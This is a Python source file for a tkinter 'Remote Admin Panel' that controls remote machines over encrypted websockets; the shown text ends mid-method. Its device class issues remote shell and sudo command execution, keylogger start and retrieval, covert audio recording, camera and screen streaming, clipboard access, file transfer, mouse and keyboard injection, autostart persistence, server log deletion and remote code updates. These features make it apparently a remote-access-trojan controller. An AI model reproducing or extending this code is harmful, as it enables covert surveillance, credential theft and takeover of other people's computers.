"""
gui_client.py — GUI admin panel (pure tkinter + PIL).

Fixed: ws.close() async handling, TimeoutError suppression, screen stream tab.
"""

import asyncio
import base64
import io
import json
import logging
import os
import platform
import queue
import sys
import tempfile
import threading
import time
import uuid

import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext

import websockets
from PIL import Image, ImageTk
from shared import CHUNK_SIZE, decrypt_msg, encrypt_msg, make_fernet

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("gui")

try:
    sys.stdout.reconfigure(encoding="utf-8")
    sys.stderr.reconfigure(encoding="utf-8")
except AttributeError:
    pass

C_BG = "#0d1117"
C_SURFACE = "#161b22"
C_BORDER = "#30363d"
C_FG = "#c9d1d9"
C_FG_DIM = "#8b949e"
C_ACCENT = "#58a6ff"
C_GREEN = "#3fb950"
C_RED = "#f85149"
C_ORANGE = "#d29922"


def style_window(root):
    root.configure(bg=C_BG)
    s = ttk.Style()
    s.theme_use("clam")
    s.configure(".", background=C_BG, foreground=C_FG, font=("Segoe UI", 9))
    s.configure("TFrame", background=C_SURFACE)
    s.configure("TLabel", background=C_SURFACE, foreground=C_FG)
    s.configure("TButton", background=C_BORDER, foreground=C_FG, borderwidth=1, focuscolor=C_ACCENT)
    s.map("TButton", background=[("active", C_ACCENT)])
    s.configure("TEntry", fieldbackground=C_BG, foreground=C_FG, insertcolor=C_FG)
    s.configure("TNotebook", background=C_SURFACE, borderwidth=1)
    s.configure("TNotebook.Tab", background=C_BORDER, foreground=C_FG_DIM, padding=[12, 6])
    s.map("TNotebook.Tab", background=[("selected", C_SURFACE)], foreground=[("selected", C_ACCENT)])
    s.configure("TCombobox", fieldbackground=C_BG, foreground=C_FG)
    s.map("TCombobox", fieldbackground=[("readonly", C_BG)])


def mbtn(parent, text, command=None, width=None):
    return ttk.Button(parent, text=text, command=command, width=width)


def mlabel(parent, text=None, textvariable=None, fg=None, bg=None, font=None):
    c = fg if fg else C_FG
    b = bg if bg else C_SURFACE
    f = font if font else ("Segoe UI", 10)
    kwargs = {"bg": b, "fg": c, "font": f}
    if text is not None:
        kwargs["text"] = text
    if textvariable is not None:
        kwargs["textvariable"] = textvariable
    return tk.Label(parent, **kwargs)


def mbox(parent, height=12):
    t = scrolledtext.ScrolledText(parent, bg=C_BG, fg=C_FG,
                                   insertbackground=C_FG,
                                   font=("Consolas", 10), height=height,
                                   relief="solid", borderwidth=1)
    return t


def mappend(tb, text):
    tb.configure(state="normal")
    tb.insert("end", text)
    tb.see("end")


def mclear(tb):
    tb.configure(state="normal")
    tb.delete("1.0", "end")


# =========================================================================
# Device
# =========================================================================
class Device:
    def __init__(self, uid, name, host, port, secret):
        self.uid = uid
        self.name = name
        self.host = host
        self.port = port
        self.secret = secret
        self.ws = None
        self.fernet = None
        self.connected = False
        self.running = False
        self.loop = None
        self.msg_queue = queue.Queue()
        self._shell_is_open = False
        self._stream_is_open = False
        self._screen_stream_is_open = False
        self.camera_index = 0

    def label(self):
        return self.name + " (" + self.host + ":" + str(self.port) + ")"

    def connect_async(self):
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.thread.start()

    def _run_loop(self):
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        self.fernet = make_fernet(self.secret)
        uri = "ws://" + self.host + ":" + str(self.port)

        async def main():
            ws = None
            try:
                ws = await websockets.connect(
                    uri, ping_interval=30, ping_timeout=10,
                    close_timeout=2)
                self.ws = ws
                await self._auth()
                self.msg_queue.put({"type": "connected"})
                await self._recv()
            except asyncio.TimeoutError:
                self.msg_queue.put({"type": "disconnected"})
            except websockets.exceptions.InvalidStatus:
                self.msg_queue.put({"type": "disconnected"})
            except websockets.exceptions.ConnectionClosedError:
                self.msg_queue.put({"type": "disconnected"})
            except OSError:
                self.msg_queue.put({"type": "disconnected"})
            except Exception as e:
                log.exception("Connection error: %s", e)
                self.msg_queue.put({"type": "disconnected"})
            finally:
                self.running = False
                self.connected = False
                if ws:
                    try:
                        await ws.close()
                    except Exception:
                        pass
                self.ws = None
                self.msg_queue.put({"type": "disconnected"})

        self.loop.run_until_complete(main())

    def wait_connected(self, timeout=15):
        t0 = time.monotonic()
        while time.monotonic() - t0 < timeout:
            try:
                r = self.msg_queue.get(timeout=0.5)
                if r["type"] == "connected":
                    return True
                if r["type"] == "disconnected":
                    return False
            except queue.Empty:
                continue
        return False

    async def _auth(self):
        msg = {"type": "auth", "payload": {"token": self.secret}}
        await self.ws.send(encrypt_msg(self.fernet, msg))
        raw = await asyncio.wait_for(self.ws.recv(), timeout=10)
        resp = decrypt_msg(self.fernet, raw)
        if resp.get("type") == "auth_ok":
            self.connected = True
            self.running = True
        else:
            raise Exception("Auth rejected")

    async def _recv(self):
        try:
            async for raw in self.ws:
                if not raw:
                    continue
                try:
                    msg = decrypt_msg(self.fernet, raw)
                except Exception:
                    continue
                t = msg.get("type")
                if t:
                    self.msg_queue.put({"type": t, "data": msg.get("payload", {})})
        except websockets.exceptions.ConnectionClosed:
            pass
        except asyncio.CancelledError:
            pass
        except Exception as e:
            log.exception("Recv: %s", e)

    def _send(self, msg_type, payload=None):
        if not self.ws or not self.running:
            return False
        msg = {"type": msg_type, "payload": payload or {}}
        def do():
            asyncio.run_coroutine_threadsafe(
                self.ws.send(encrypt_msg(self.fernet, msg)), self.loop)
        threading.Thread(target=do, daemon=True).start()
        return True

    def _wait_resp(self, resp_type, timeout=20):
        t0 = time.monotonic()
        while time.monotonic() - t0 < timeout:
            try:
                r = self.msg_queue.get(timeout=0.5)
                if r["type"] == resp_type:
                    return r
                else:
                    self.msg_queue.put(r)
                    time.sleep(0.02)
            except queue.Empty:
                continue
        return None

    def close_ws(self):
        """Safely close websocket connection."""
        self.running = False
        self.connected = False
        if self.ws:
            try:
                if self.loop and not self.loop.is_closed():
                    asyncio.run_coroutine_threadsafe(self.ws.close(), self.loop)
                else:
                    try:
                        import threading as _th
                        _th.Thread(target=lambda: self.loop.run_until_complete(self.ws.close()) if self.loop and not self.loop.is_closed() else None, daemon=True).start()
                    except Exception:
                        pass
            except Exception:
                pass
        self.ws = None
        while not self.msg_queue.empty():
            try:
                self.msg_queue.get_nowait()
            except queue.Empty:
                break

    def ping(self):
        self._send("ping")
        t0 = time.monotonic()
        while time.monotonic() - t0 < 5:
            try:
                r = self.msg_queue.get(timeout=0.5)
                if r["type"] == "pong":
                    return (time.monotonic() - t0) * 1000
                else:
                    self.msg_queue.put(r)
                    time.sleep(0.02)
            except queue.Empty:
                continue
        return None

    def screenshot(self, quality=80):
        self._send("screenshot", {"quality": quality})
        r = self._wait_resp("screenshot_data", timeout=20)
        return r["data"] if r else None

    def exec_cmd(self, command, timeout=60, sudo_password=None):
        payload = {"command": command, "timeout": timeout}
        if sudo_password:
            payload["sudo_password"] = sudo_password
        self._send("exec", payload)
        r = self._wait_resp("exec_result", timeout=float(timeout) + 10)
        return r["data"] if r else {"stdout": "", "stderr": "Timeout", "returncode": -1}

    def open_shell(self):
        self._send("shell_open")
        self._shell_is_open = True

    def shell_input(self, data):
        self._send("shell_input", {"data": data})

    def shell_output_wait(self, timeout=2):
        t0 = time.monotonic()
        out = []
        while time.monotonic() - t0 < timeout:
            try:
                r = self.msg_queue.get(timeout=0.3)
                if r["type"] == "shell_output":
                    text = r["data"].get("stdout", "") + r["data"].get("stderr", "")
                    if text:
                        out.append(text)
                else:
                    self.msg_queue.put(r)
                    time.sleep(0.02)
            except queue.Empty:
                break
        return "".join(out)

    def close_shell(self):
        self._send("shell_close")
        self._shell_is_open = False

    def stream_start(self, fps=10):
        self._send("stream_start", {"fps": fps})
        self._stream_is_open = True

    def stream_stop(self):
        self._send("stream_stop")
        self._stream_is_open = False

    # Screen stream
    def screen_start(self, fps=5, quality=70):
        self._send("screen_start", {"fps": fps, "quality": quality})
        self._screen_stream_is_open = True

    def screen_stop(self):
        self._send("screen_stop")
        self._screen_stream_is_open = False

    def send_file(self, local_path, remote_path):
        if not os.path.exists(local_path):
            return False, "File not found"
        with open(local_path, "rb") as f:
            raw = f.read()
        b64 = base64.b64encode(raw).decode()
        total = max(1, -(-len(b64) // CHUNK_SIZE))
        for i in range(total):
            s = i * CHUNK_SIZE
            e = s + CHUNK_SIZE
            self._send("file_send", {
                "path": remote_path, "data_b64": b64[s:e],
                "chunk_index": i, "total_chunks": total})
            if i < total - 1:
                time.sleep(0.05)
        r = self._wait_resp("ack", timeout=30)
        return (True, "Sent (" + str(total) + " chunks)") if r else (False, "No ack")

    def recv_file(self, remote_path, local_path):
        self._send("file_recv", {"path": remote_path})
        received = {}
        total_chunks = None
        t0 = time.monotonic()
        while time.monotonic() - t0 < 120:
            try:
                r = self.msg_queue.get(timeout=1)
                if r["type"] == "file_data":
                    p = r["data"]
                    received[p["chunk_index"]] = p["data_b64"]
                    if total_chunks is None:
                        total_chunks = p["total_chunks"]
                    if len(received) >= total_chunks:
                        break
                elif r["type"] in ("error", "server_error"):
                    return False, r.get("data", {}).get("message", "Error")
            except queue.Empty:
                continue
        if not received:
            return False, "No data"
        b64_full = "".join(received[i] for i in range(total_chunks))
        local = local_path
        if os.path.isdir(local_path):
            fname = received[0].get("filename", "downloaded_file")
            local = os.path.join(local_path, fname)
        os.makedirs(os.path.dirname(local) or ".", exist_ok=True)
        with open(local, "wb") as f:
            f.write(base64.b64decode(b64_full))
        return True, "Saved (" + str(os.path.getsize(local)) + " bytes)"

    def keylog_start(self):
        self._send("keylog_start")
        r = self._wait_resp("keylog_status", timeout=10)
        return r["data"]["status"] if r else "timeout"

    def keylog_stop(self):
        self._send("keylog_stop")
        r = self._wait_resp("keylog_status", timeout=10)
        return r["data"]["status"] if r else "timeout"

    def keylog_get(self):
        self._send("keylog_get")
        r = self._wait_resp("keylog_data", timeout=10)
        return r["data"] if r else {"data": "", "length": 0}

    def audio_start(self, duration=None):
        self._send("audio_start", {"duration": duration})
        r = self._wait_resp("audio_status", timeout=10)
        return r["data"] if r else {"status": "timeout", "message": "No response"}

    def audio_stop(self):
        self._send("audio_stop")
        r = self._wait_resp("audio_status", timeout=10)
        return r["data"] if r else {"status": "timeout", "message": "No response"}

    def audio_list_data(self):
        self._send("audio_list")
        r = self._wait_resp("audio_list", timeout=10)
        return r["data"].get("recordings", []) if r else []

    def audio_download(self, name, save_dir):
        self._send("audio_download", {"name": name})
        received = {}
        total_chunks = None
        t0 = time.monotonic()
        while time.monotonic() - t0 < 120:
            try:
                r = self.msg_queue.get(timeout=1)
                if r["type"] == "audio_data":
                    p = r["data"]
                    received[p["chunk_index"]] = p["data_b64"]
                    if total_chunks is None:
                        total_chunks = p["total_chunks"]
                    if len(received) >= total_chunks:
                        break
            except queue.Empty:
                continue
        if not received:
            return False, "No data"
        b64_full = "".join(received[i] for i in range(total_chunks))
        path = os.path.join(save_dir, name)
        with open(path, "wb") as f:
            f.write(base64.b64decode(b64_full))
        return True, "Saved: " + path

    def audio_delete(self, name=None):
        self._send("audio_delete", {"name": name or ""})
        r = self._wait_resp("audio_status", timeout=10)
        return r["data"] if r else None

    def log_view(self):
        self._send("log_view")
        r = self._wait_resp("log_view_result", timeout=10)
        return r["data"] if r else {"exists": False, "lines": "", "message": "No response"}

    def log_download(self, save_dir):
        self._send("log_download")
        received = {}
        total_chunks = None
        t0 = time.monotonic()
        while time.monotonic() - t0 < 120:
            try:
                r = self.msg_queue.get(timeout=1)
                if r["type"] == "log_download_chunk":
                    p = r["data"]
                    received[p["chunk_index"]] = p["data_b64"]
                    if total_chunks is None:
                        total_chunks = p["total_chunks"]
                    if len(received) >= total_chunks:
                        break
                elif r["type"] == "log_download_result":
                    p = r["data"]
                    if p.get("success") and received:
                        b64_full = "".join(received[i] for i in range(total_chunks))
                        path = os.path.join(save_dir, p.get("filename", "server.log"))
                        with open(path, "wb") as f:
                            f.write(base64.b64decode(b64_full))
                        return True, "Saved: " + path
                    return False, p.get("message", "Failed")
            except queue.Empty:
                continue
        return False, "Timeout or no data"

    def log_delete(self):
        self._send("log_delete")
        r = self._wait_resp("log_delete_result", timeout=10)
        return r["data"] if r else {"success": False, "message": "No response"}

    def install_autostart(self, secret=None):
        self._send("install_autostart", {"secret": secret or ""})
        r = self._wait_resp("autostart_result", timeout=10)
        return r["data"] if r else {"success": False, "message": "No response"}

    def remove_autostart(self):
        self._send("remove_autostart")
        r = self._wait_resp("autostart_result", timeout=10)
        return r["data"] if r else {"success": False, "message": "No response"}

    def restart_server(self):
        self._send("server_restart")
        r = self._wait_resp("server_restart_ack", timeout=15)
        if r:
            self.connected = False
            self.running = False
        return r is not None

    def sysinfo(self):
        self._send("sysinfo")
        r = self._wait_resp("sysinfo", timeout=15)
        return r["data"] if r else {}

    def process_list(self):
        self._send("process_list")
        r = self._wait_resp("process_list", timeout=15)
        return r["data"].get("processes", []) if r else []

    def process_kill(self, pid=None, name=None):
        self._send("process_kill", {"pid": pid, "name": name})
        r = self._wait_resp("process_kill_result", timeout=10)
        return r["data"] if r else {"success": False, "message": "No response"}

    def fs_list(self, path="."):
        self._send("fs_list", {"path": path})
        r = self._wait_resp("fs_list", timeout=10)
        return r["data"] if r else {"error": "No response"}

    def clipboard_get(self):
        self._send("clipboard_get")
        r = self._wait_resp("clipboard_result", timeout=10)
        return r["data"] if r else {"success": False, "text": "No response"}

    def clipboard_set(self, text):
        self._send("clipboard_set", {"text": text})
        r = self._wait_resp("clipboard_result", timeout=10)
        return r["data"] if r else {"success": False, "text": "No response"}

    def heartbeat(self):
        self._send("heartbeat")
        r = self._wait_resp("heartbeat", timeout=10)
        return r["data"] if r else {}

    def uninstall(self):
        self._send("uninstall")
        r = self._wait_resp("uninstall_result", timeout=15)
        return r["data"] if r else {"success": False, "message": "No response"}

    def update_github(self):
        self._send("update")
        return True

    def mouse_move(self, x, y, relative=False):
        self._send("mouse_move", {"x": x, "y": y, "relative": relative})
        r = self._wait_resp("mouse_result", timeout=5)
        return r["data"] if r else {"success": False, "message": "No response"}

    def mouse_click(self, x=None, y=None, button="left", clicks=1):
        p = {"button": button, "clicks": clicks}
        if x is not None:
            p["x"] = x
            p["y"] = y
        self._send("mouse_click", p)
        r = self._wait_resp("mouse_result", timeout=5)
        return r["data"] if r else {"success": False, "message": "No response"}

    def mouse_scroll(self, dx=0, dy=0):
        self._send("mouse_scroll", {"dx": dx, "dy": dy})
        r = self._wait_resp("mouse_result", timeout=5)
        return r["data"] if r else {"success": False, "message": "No response"}

    def keyboard_type(self, text):
        self._send("keyboard_type", {"text": text})
        r = self._wait_resp("keyboard_result", timeout=10)
        return r["data"] if r else {"success": False, "message": "No response"}

    def keyboard_hotkey(self, keys):
        self._send("keyboard_hotkey", {"keys": keys})
        r = self._wait_resp("keyboard_result", timeout=5)
        return r["data"] if r else {"success": False, "message": "No response"}

    def keyboard_press(self, key):
        self._send("keyboard_press", {"key": key})
        r = self._wait_resp("keyboard_result", timeout=5)
        return r["data"] if r else {"success": False, "message": "No response"}


# =========================================================================
# Device store
# =========================================================================
DEVICES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "devices.json")


def load_devices():
    try:
        if os.path.exists(DEVICES_FILE):
            with open(DEVICES_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            return {d["uid"]: Device(**d) for d in data}
    except Exception:
        log.exception("Load devices error")
    return {}


def save_devices(devices):
    data = []
    for d in devices.values():
        data.append({"uid": d.uid, "name": d.name, "host": d.host,
                      "port": d.port, "secret": d.secret})
    try:
        with open(DEVICES_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
    except Exception:
        log.exception("Save devices error")


def add_device(devices, device):
    for e in devices.values():
        if e.host == device.host and e.port == device.port:
            return None, "Already exists"
    devices[device.uid] = device
    save_devices(devices)
    return device, None


def remove_device(devices, uid):
    devices.pop(uid, None)
    save_devices(devices)


# =========================================================================
# Helpers
# =========================================================================
def show_image_in_window(image_b64):
    w = tk.Toplevel()
    w.title("Screenshot")
    w.configure(bg=C_BG)
    img = Image.open(io.BytesIO(base64.b64decode(image_b64)))
    max_h = 800
    if img.height > max_h:
        ratio = max_h / img.height
        img = img.resize((int(img.width * ratio), max_h), Image.Resampling.LANCZOS)
    photo = ImageTk.PhotoImage(img)
    lbl = tk.Label(w, image=photo, bg=C_BG)
    lbl.image = photo
    lbl.pack(expand=True, fill="both")
    w.geometry(str(img.width) + "x" + str(img.height))
    w.focus_force()


# =========================================================================
# Dialogs
# =========================================================================
class AddDeviceDialog:
    device = None

    def __init__(self, parent):
        self.win = tk.Toplevel(parent)
        self.win.title("Add Device")
        self.win.geometry("320x180")
        self.win.configure(bg=C_SURFACE)
        self.win.resizable(False, False)
        self.win.transient(parent)
        self.win.grab_set()

        tk.Label(self.win, text="Name:", bg=C_SURFACE, fg=C_FG).place(x=15, y=12)
        self.e_name = ttk.Entry(self.win, width=28)
        self.e_name.place(x=90, y=12)
        self.e_name.insert(0, "PC-" + uuid.uuid4().hex[:4].upper())

        tk.Label(self.win, text="Host:", bg=C_SURFACE, fg=C_FG).place(x=15, y=42)
        self.e_host = ttk.Entry(self.win, width=28)
        self.e_host.place(x=90, y=42)
        self.e_host.insert(0, "192.168.1.")

        tk.Label(self.win, text="Port:", bg=C_SURFACE, fg=C_FG).place(x=15, y=72)
        self.e_port = ttk.Entry(self.win, width=8)
        self.e_port.place(x=90, y=72)
        self.e_port.insert(0, "8765")

        tk.Label(self.win, text="Secret:", bg=C_SURFACE, fg=C_FG).place(x=15, y=102)
        self.e_secret = ttk.Entry(self.win, width=28, show="*")
        self.e_secret.place(x=90, y=102)

        mbtn(self.win, "Add", self._ok, width=12).place(x=100, y=138)
        mbtn(self.win, "Cancel", self._cancel, width=12).place(x=210, y=138)

    def _ok(self):
        n = self.e_name.get().strip()
        h = self.e_host.get().strip()
        try:
            p = int(self.e_port.get().strip())
        except ValueError:
            return
        s = self.e_secret.get().strip()
        if not n or not h or not s:
            return
        self.device = Device(uid=uuid.uuid4().hex[:8], name=n, host=h, port=p, secret=s)
        self.win.destroy()

    def _cancel(self):
        self.win.destroy()


class UpdateDialog:
    def __init__(self, parent, device):
        self.win = tk.Toplevel(parent)
        self.win.title("Update: " + device.name)
        self.win.geometry("500x480")
        self.win.configure(bg=C_SURFACE)
        self.win.resizable(False, False)
        self.win.transient(parent)
        self.win.grab_set()
        self.dev = device
        self.selected_files = []
        self.zip_path = None

        tk.Label(self.win, text="Remote Update: " + device.name,
                 bg=C_SURFACE, fg=C_FG, font=("Segoe UI", 12, "bold")).pack(pady=(10, 5))

        # ── Section 1: Quick Update (server.py + shared.py) ──
        f1 = tk.LabelFrame(self.win, text="Quick Update", bg=C_SURFACE, fg=C_FG,
                           font=("Segoe UI", 10, "bold"))
        f1.pack(fill="x", padx=20, pady=(8, 4), ipady=8)

        tk.Label(f1, text="Update: server.py + shared.py from local project dir",
                 bg=C_SURFACE, fg=C_FG_DIM, font=("Segoe UI", 9)).pack(pady=(2, 6))

        self.quick_btn = mbtn(f1, "⚡ Update Now", self._quick_update, width=16)
        self.quick_btn.pack(pady=2)

        # ── Section 2: File Upload ──
        f2 = tk.LabelFrame(self.win, text="Upload Files", bg=C_SURFACE, fg=C_FG,
                           font=("Segoe UI", 10, "bold"))
        f2.pack(fill="x", padx=20, pady=(4, 4), ipady=8)

        self.files_lbl = mlabel(f2, "[no files selected]", fg=C_FG_DIM)
        self.files_lbl.pack(pady=(2, 4))

        btn_row = tk.Frame(f2, bg=C_SURFACE)
        btn_row.pack(pady=2)
        mbtn(btn_row, "Browse", self._browse).pack(side="left", padx=4)
        mbtn(btn_row, "Send to Device", self._send_files).pack(side="left", padx=4)

        # ── Section 3: ZIP Update ──
        f3 = tk.LabelFrame(self.win, text="ZIP Update", bg=C_SURFACE, fg=C_FG,
                           font=("Segoe UI", 10, "bold"))
        f3.pack(fill="x", padx=20, pady=(4, 4), ipady=8)

        tk.Label(f3, text="Upload a .zip archive and apply it remotely",
                 bg=C_SURFACE, fg=C_FG_DIM, font=("Segoe UI", 9)).pack(pady=(2, 4))

        self.zip_lbl = mlabel(f3, "[no ZIP selected]", fg=C_FG_DIM)
        self.zip_lbl.pack(pady=2)

        zrow = tk.Frame(f3, bg=C_SURFACE)
        zrow.pack(pady=2)
        mbtn(zrow, "Browse ZIP", self._browse_zip).pack(side="left", padx=4)
        self.apply_btn = mbtn(zrow, "Upload & Apply", self._apply, width=16)
        self.apply_btn.pack(side="left", padx=4)
        self.apply_btn.configure(state="disabled")

        # ── Section 4: GitHub Auto Update ──
        f4 = tk.LabelFrame(self.win, text="GitHub Auto Update", bg=C_SURFACE, fg=C_FG,
                           font=("Segoe UI", 10, "bold"))
        f4.pack(fill="x", padx=20, pady=(4, 4), ipady=8)

        tk.Label(f4, text="Download latest version from GitHub and restart server",
                 bg=C_SURFACE, fg=C_FG_DIM, font=("Segoe UI", 9)).pack(pady=(2, 4))

        self.github_btn = mbtn(f4, "🔄 Update from GitHub", self._github_update, width=20)
        self.github_btn.pack(pady=2)

        # ── Status ──
        self.status_var = tk.StringVar(value="")
        mlabel(self.win, textvariable=self.status_var, fg=C_FG_DIM).pack(pady=4)

        mbtn(self.win, "Close", self.win.destroy).pack(pady=(2, 8))

    def _quick_update(self):
        if not self._check_conn(): return
        self.quick_btn.configure(state="disabled")
        self.status_var.set("Preparing update...")
        threading.Thread(target=self._do_quick_update, daemon=True).start()

    def _check_conn(self):
        if not self.dev or not self.dev.connected:
            messagebox.showerror("Error", "Device not connected")
            self.quick_btn.configure(state="normal")
            return False
        return True

    def _do_quick_update(self):
        """One-click update: sends server.py + shared.py from project dir."""
        import zipfile
        tmp_zip = os.path.join(tempfile.gettempdir(), "_remote_update_pkg.zip")
        try:
            proj_dir = os.path.dirname(os.path.abspath(__file__))
            server_py = os.path.join(proj_dir, "server.py")
            shared_py = os.path.join(proj_dir, "shared.py")

            if not os.path.isfile(server_py):
                self.win.after(0, lambda: self.status_var.set("server.py not found!"))
                self.win.after(0, lambda: self.quick_btn.configure(state="normal"))
                return
            if not os.path.isfile(shared_py):
                self.win.after(0, lambda: self.status_var.set("shared.py not found!"))
                self.win.after(0, lambda: self.quick_btn.configure(state="normal"))
                return

            with zipfile.ZipFile(tmp_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.write(server_py, "server.py")
                zf.write(shared_py, "shared.py")

            self.win.after(0, lambda: self.status_var.set("Uploading server.py + shared.py..."))
            ok, msg = self.dev.send_file(tmp_zip, "_remote_update_pkg.zip")
            if not ok:
                self.win.after(0, lambda: self.status_var.set("Upload failed: " + msg))
                self.win.after(0, lambda: self.quick_btn.configure(state="normal"))
                return

            self.win.after(0, lambda: self.status_var.set("Applying... server will restart"))
            self.dev._send("update_apply", {"path": "_remote_update_pkg.zip"})
            r = self.dev._wait_resp("update_complete", timeout=120)
            if r:
                st = r["data"].get("status", "OK")
                self.win.after(0, lambda: self.status_var.set("Applied: " + st))
            else:
                self.win.after(0, lambda: self.status_var.set("Sent, server restarting..."))
                threading.Thread(target=self._wait_reconn, daemon=True).start()
        except Exception as e:
            self.win.after(0, lambda: self.status_var.set("Error: " + str(e)))
        finally:
            if os.path.isfile(tmp_zip):
                try: os.remove(tmp_zip)
                except Exception: pass
            self.win.after(0, lambda: self.quick_btn.configure(state="normal"))

    def _browse_zip(self):
        p = filedialog.askopenfilename(filetypes=[("ZIP", "*.zip")])
        if p:
            self.zip_path = p
            self.zip_lbl.configure(text=os.path.basename(p))
            self.apply_btn.configure(state="normal")

    def _apply(self):
        if not self.zip_path:
            return
        self.apply_btn.configure(state="disabled")
        self.status_var.set("Uploading ZIP...")
        threading.Thread(target=self._do_upd_zip, daemon=True).start()

    def _do_upd_zip(self):
        tmp = "update_temp.zip"
        ok, msg = self.dev.send_file(self.zip_path, tmp)
        if not ok:
            self.win.after(0, lambda: self.status_var.set("Upload failed"))
            self.win.after(0, lambda: self.apply_btn.configure(state="normal"))
            return
        self.dev._send("update_apply", {"path": tmp})
        r = self.dev._wait_resp("update_complete", timeout=120)
        if r:
            st = r["data"].get("status", "OK")
            self.win.after(0, lambda: self.status_var.set("Applied: " + st))
            self.win.after(0, lambda: self.apply_btn.configure(state="normal"))
        else:
            self.win.after(0, lambda: self.status_var.set("Sent, server restarting..."))
            self.win.after(0, lambda: self.apply_btn.configure(state="normal"))
            threading.Thread(target=self._wait_reconn, daemon=True).start()

    def _github_update(self):
        if not self.dev or not self.dev.connected:
            messagebox.showerror("Error", "Device not connected")
            return
        if not messagebox.askyesno("GitHub Update",
                "Update from GitHub (Pryanik-M/GoodScript)?\nServer will restart after update."):
            return
        self.github_btn.configure(state="disabled")
        self.status_var.set("Sending update command...")
        threading.Thread(target=self._do_github_update, daemon=True).start()

    def _do_github_update(self):
        try:
            self.dev.update_github()
            self.win.after(0, lambda: self.status_var.set("Update command sent. Monitoring status..."))
            t0 = time.monotonic()
            while time.monotonic() - t0 < 120:
                try:
                    r = self.dev.msg_queue.get(timeout=1)
                    if r["type"] == "update_status":
                        status = r["data"].get("status", "")
                        message = r["data"].get("message", "")
                        self.win.after(0, lambda s=status, m=message: self.status_var.set(
                            {"starting": "🔄 " + m, "downloading": "📥 " + m,
                             "extracting": "📦 " + m, "installing": "⚙️ " + m,
                             "restarting": "🔃 " + m, "error": "❌ " + m}.get(s, m)))
                        if status == "restarting":
                            self.win.after(0, lambda: self.status_var.set("🔃 Server restarting..."))
                            threading.Thread(target=self._wait_reconn, daemon=True).start()
                            return
                        if status == "error":
                            self.win.after(0, lambda: self.github_btn.configure(state="normal"))
                            return
                    else:
                        self.dev.msg_queue.put(r)
                        time.sleep(0.02)
                except queue.Empty:
                    continue
            self.win.after(0, lambda: self.status_var.set("Timeout waiting for update"))
            self.win.after(0, lambda: self.github_btn.configure(state="normal"))
        except Exception as e:
            self.win.after(0, lambda: self.status_var.set("Error: " + str(e)))
            self.win.after(0, lambda: self.github_btn.configure(state="normal"))

    def _wait_reconn(self):
        time.sleep(20)
        for _ in range(10):
            try:
                loop = asyncio.new_event_loop()
                ws = loop.run_until_complete(
                    websockets.connect("ws://" + self.dev.host + ":" + str(self.dev.port), ping_timeout=3))
                ws.close()
                loop.close()
                self.win.after(0, lambda: messagebox.showinfo("OK", "Server back online!"))
                return
            except Exception:
                time.sleep(5)


# =========================================================================
# App
# =========================================================================
class App:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Remote Admin Panel")
        self.root.geometry("1100x750")
        self.root.minsize(900, 600)
        style_window(self.root)

        self.devices = load_devices()
        self.dev = None
        self._shell_is_active = False
        self.stream_active = False
        self.screen_active = False
        self.keylog_auto_running = False
        self.cam_photo = None
        self.update_zip_path = ""
        self.send_local_path = ""
        self.recording = False
        self._monitoring_ping = False
        self.ping_fail_count = 0

        self._build_topbar()
        self._build_tabs()
        self._poll()
        self._start_monitor()

    def _start_monitor(self):
        self._monitoring_ping = True
        threading.Thread(target=self._ping_loop, daemon=True).start()

    def _ping_loop(self):
        while self._monitoring_ping:
            time.sleep(15)
            if self.dev and self.dev.connected:
                ms = self.dev.ping()
                if ms is None:
                    self.ping_fail_count += 1
                    if self.ping_fail_count >= 2:
                        self.ping_fail_count = 0
                        self.root.after(0, self._on_ping_fail)
                else:
                    self.ping_fail_count = 0

    def _on_ping_fail(self):
        if self.dev and self.dev.connected:
            self._status(self.dev.name + " offline", C_RED)
            if hasattr(self, "shell_st"):
                self.shell_st.configure(text="[Offline]", fg=C_RED)

    # ──── top bar ────
    def _build_topbar(self):
        top = tk.Frame(self.root, bg=C_SURFACE)
        top.pack(fill="x", padx=5, pady=4)

        mlabel(top, "Remote Admin", font=("Segoe UI", 14, "bold")).pack(side="left", padx=6)
        self.status_bar = mlabel(top, "No connection", fg=C_RED, font=("Consolas", 11))
        self.status_bar.pack(side="left", padx=12)
        self.lat_var = tk.StringVar(value="Lat: --")
        mlabel(top, textvariable=self.lat_var, fg=C_FG_DIM, font=("Consolas", 10)).pack(side="left", padx=4)

        mlabel(top, "Device:").pack(side="left", padx=(12, 2))
        self.dev_combo = ttk.Combobox(top, state="readonly", width=26, font=("Segoe UI", 9))
        self.dev_combo.pack(side="left", padx=2)
        self.dev_combo.bind("<<ComboboxSelected>>", self._on_sel_dev)

        mbtn(top, "Add", self._on_add).pack(side="left", padx=2)
        mbtn(top, "Del", self._on_del).pack(side="left", padx=2)
        mbtn(top, "Connect", self._on_connect).pack(side="left", padx=8)
        mbtn(top, "Ping", self._on_ping).pack(side="left", padx=2)
        mbtn(top, "Update", self._on_update).pack(side="left", padx=6)

        self._refresh_combo()

    def _refresh_combo(self):
        vals = [d.label() for d in self.devices.values()]
        self.dev_combo["values"] = vals
        if vals:
            self.dev_combo.current(0)

    def _on_sel_dev(self, event=None):
        lbl = self.dev_combo.get()
        for d in self.devices.values():
            if d.label() == lbl:
                self.dev = d
                break

    def _on_add(self):
        dlg = AddDeviceDialog(self.root)
        self.root.wait_window(dlg.win)
        if dlg.device:
            ok, err = add_device(self.devices, dlg.device)
            if ok:
                self._refresh_combo()
                messagebox.showinfo("OK", "Added: " + ok.label())
            else:
                messagebox.showerror("Error", err)

    def _on_del(self):
        self._pick_dev()
        if not self.dev:
            return
        if messagebox.askyesno("Delete", "Remove " + self.dev.label() + "?"):
            remove_device(self.devices, self.dev.uid)
            self.dev.connected = False
            self.dev = None
            self._refresh_combo()

    def _pick_dev(self):
        self._on_sel_dev()

    def _check_dev(self):
        self._pick_dev()
        if not self.dev:
            messagebox.showinfo("Info", "Select a device first")
            return False
        return True

    def _check_conn(self):
        self._pick_dev()
        if not self.dev or not self.dev.connected:
            messagebox.showinfo("Info", "Not connected")
            return False
        return True

    def _on_connect(self):
        self._pick_dev()
        if not self.dev:
            return
